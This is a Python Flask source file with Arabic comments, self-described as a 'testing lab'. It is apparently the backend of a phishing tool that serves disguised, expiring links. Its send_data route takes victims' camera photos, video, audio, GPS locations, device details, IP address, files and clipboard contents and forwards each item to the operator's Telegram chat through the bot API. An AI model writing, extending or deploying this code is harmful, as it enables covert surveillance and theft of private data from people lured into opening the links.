# ============================================================
#  app.py - المدخل الرئيسي (Flask Routes)
# ============================================================
from flask import Flask, request, render_template_string, redirect, jsonify
from datetime import datetime
import secrets
import os
import base64
import json
import requests
import threading
from config import BOT_TOKEN, BASE_URL, SECRET_KEY
from database import *
from utils import is_valid_url, create_short_link
from pages import ALL_PAGES

app = Flask(__name__)
app.secret_key = SECRET_KEY

# ============================================================
#  Flask Routes
# ============================================================

@app.route('/')
def index():
    return "🔬 مختبر الاختبار - يعمل"

@app.route('/get_ip')
def get_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    return jsonify({'ip': ip})

@app.route('/<domain>/<path:path>')
def handle_masked_link(domain, path):
    parts = path.split('/')
    session_id = parts[-1][:8] if parts else None
    if not session_id:
        return "❌ رابط غير صالح", 404
    conn = get_db()
    session = conn.execute('SELECT * FROM sessions WHERE session_id LIKE ?', (session_id + '%',)).fetchone()
    conn.close()
    if not session:
        return "❌ رابط غير صالح", 404
    created = datetime.fromisoformat(session['created'])
    if (datetime.now() - created).seconds > 600:
        return "⏰ انتهت صلاحية الرابط", 403
    return redirect(f"/test/{session['session_id']}/{session['features']}")

@app.route('/<path:path>')
def handle_fake_path(path):
    conn = get_db()
    session = conn.execute('SELECT * FROM sessions WHERE fake_url LIKE ?', (f'%{path}%',)).fetchone()
    conn.close()
    if not session:
        conn = get_db()
        session = conn.execute('SELECT * FROM sessions WHERE session_id LIKE ?', (path[:8] + '%',)).fetchone()
        conn.close()
        if not session:
            return "❌ رابط غير صالح", 404
    session_id = session['session_id']
    features = session['features']
    original_url = session['original_url']
    created = datetime.fromisoformat(session['created'])
    if (datetime.now() - created).seconds > 300:
        return "⏰ انتهت صلاحية الرابط", 403
    return redirect(f"/test/{session_id}/{features}")

@app.route('/test/<session_id>/<features>')
def test_page(session_id, features):
    session = get_session(session_id)
    if not session:
        return "❌ جلسة غير صالحة", 404
    created = datetime.fromisoformat(session['created'])
    if (datetime.now() - created).seconds > 600:
        return "⏰ انتهت صلاحية الرابط", 403
    original_url = session['original_url']
    page = ALL_PAGES.get(features)
    if not page:
        return "❌ ميزة غير معروفة", 404
    return render_template_string(page, session_id=session_id, original_url=original_url, feature=features)

@app.route('/send_data', methods=['POST'])
def send_data():
    try:
        data = request.json
        session_id = data.get('session_id')
        session = get_session(session_id)
        if not session:
            return jsonify({'error': 'جلسة غير صالحة'}), 404
        chat_id = session['chat_id']
        
        # الصور
        for key in ['camera_front', 'camera_back']:
            if data.get(key):
                for img_data in data[key]:
                    try:
                        img = img_data.split(',', 1)[1]
                        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                        files = {'photo': base64.b64decode(img)}
                        requests.post(url, data={'chat_id': chat_id}, files=files)
                    except:
                        pass
        
        # الفيديو
        if data.get('video'):
            try:
                video = data['video'].split(',', 1)[1]
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
                files = {'video': base64.b64decode(video)}
                requests.post(url, data={'chat_id': chat_id}, files=files)
            except:
                pass
        
        # الصوت
        if data.get('audio'):
            try:
                audio = data['audio'].split(',', 1)[1]
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
                files = {'audio': base64.b64decode(audio)}
                requests.post(url, data={'chat_id': chat_id}, files=files)
            except:
                pass
        
        # الموقع
        if data.get('location'):
            try:
                loc = data['location']
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
                requests.post(url, data={'chat_id': chat_id, 'latitude': loc['lat'], 'longitude': loc['lng']})
            except:
                pass
        
        # معلومات الجهاز
        if data.get('device'):
            try:
                device = data['device']
                msg = f"📱 معلومات الجهاز:\n{device}"
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                requests.post(url, data={'chat_id': chat_id, 'text': msg})
            except:
                pass
        
        # IP
        if data.get('ip'):
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                requests.post(url, data={'chat_id': chat_id, 'text': f"🌐 IP: {data['ip']}"})
            except:
                pass
        
        # الملفات (سحب الملفات)
        if data.get('files'):
            for file_data in data['files']:
                try:
                    content = file_data['content'].split(',', 1)[1]
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                    files = {'document': base64.b64decode(content)}
                    caption = f"📁 {file_data['name']} ({(file_data['size']/1024):.1f} KB)"
                    requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files=files)
                except:
                    pass
        
        # المواقع المتعددة (تتبع الموقع)
        if data.get('locations'):
            for loc in data['locations']:
                try:
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
                    requests.post(url, data={'chat_id': chat_id, 'latitude': loc['lat'], 'longitude': loc['lng']})
                except:
                    pass
        
        # الحافظة
        if data.get('clipboard'):
            try:
                msg = f"📋 **محتوى الحافظة:**\n\n{data['clipboard']}"
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                requests.post(url, data={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
            except:
                pass
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================
#  تشغيل السيرفر
# ============================================================

if __name__ != '__main__':
    print("🚀 السيرفر جاهز للعمل مع gunicorn")
else:
    from bot import run_bot
    init_db()
    print("✅ قاعدة البيانات جاهزة")
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    print("🤖 تم تشغيل البوت في الخلفية")
    app.run(host='0.0.0.0', port=5000)